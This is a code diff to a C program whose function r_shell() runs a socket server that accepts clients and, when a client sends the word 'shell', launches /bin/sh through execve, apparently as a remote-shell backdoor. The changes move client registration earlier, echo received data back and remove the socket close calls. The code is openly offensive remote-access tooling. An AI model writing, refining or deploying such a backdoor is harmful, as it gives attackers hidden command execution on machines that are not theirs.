@@ -151,6 +151,21 @@ int r_shell(void)
                 printf("error accepting connexion\n");  
                 return -1;  
             }
+			//add new socket to array of sockets 
+            int found = 0;
+			for (int i = 0; i < MAX_CLIENTS; i++)  
+            {
+                //if position is empty 
+                if(clients_sockets[i] == 0)  
+                {  
+                    clients_sockets[i] = new_socket;  
+                    //printf("Adding to list of sockets as %d\n", i);  
+                    found = 1;
+					break;  
+                }
+            }
+			if (found == 0)
+				continue;
             //inform user of socket number - used in send and receive commands 
             //printf("New connection , socket fd is %d , ip is : %s , port : %d\n", new_socket, inet_ntoa(client_address.sin_addr), ntohs(client_address.sin_port));  
             send(new_socket, hello_msg, strlen(hello_msg), 0);
@@ -170,17 +185,6 @@ int r_shell(void)
 			}
 			send(new_socket, welcome_msg, strlen(welcome_msg), 0); 
             //printf("Welcome message sent successfully\n");    
-            //add new socket to array of sockets 
-            for (int i = 0; i < MAX_CLIENTS; i++)  
-            {
-                //if position is empty 
-                if(clients_sockets[i] == 0)  
-                {  
-                    clients_sockets[i] = new_socket;  
-                    //printf("Adding to list of sockets as %d\n", i);  
-                    break;  
-                }
-            }
 		}
 		//else its some IO operation on some other socket
         for (int i = 0; i < MAX_CLIENTS; i++)  
@@ -203,7 +207,8 @@ int r_shell(void)
                 else
                 {  
                     //set the string terminating NULL byte on the end of the data read 
-                    buffer[valread] = '\0'; 
+                    buffer[valread] = '\0';
+					// handle shell command
                     if (strncmp(buffer, "shell", 5) == 0)
 					{
 						// Start reverse shell
@@ -213,14 +218,11 @@ int r_shell(void)
 						char * const argv[] = {"/bin/sh", NULL};
 						execve("/bin/sh", argv, NULL);
 					}
-                }  
-            }  
+					send(sd, buffer, strlen(buffer), 0); 
+                }
+            }
         }
 	}
-	close(master_sd);
-	close(clients_sockets[0]);
-	close(clients_sockets[1]);
-	close(clients_sockets[2]);
 	return 0;
 }
 
@@ -234,7 +236,9 @@ int main(void)
 	while (1)
 	{
 		if (r_shell())
+		{
 			break;
+		}
 		sleep(1);
 	}
 	return EXIT_SUCCESS;
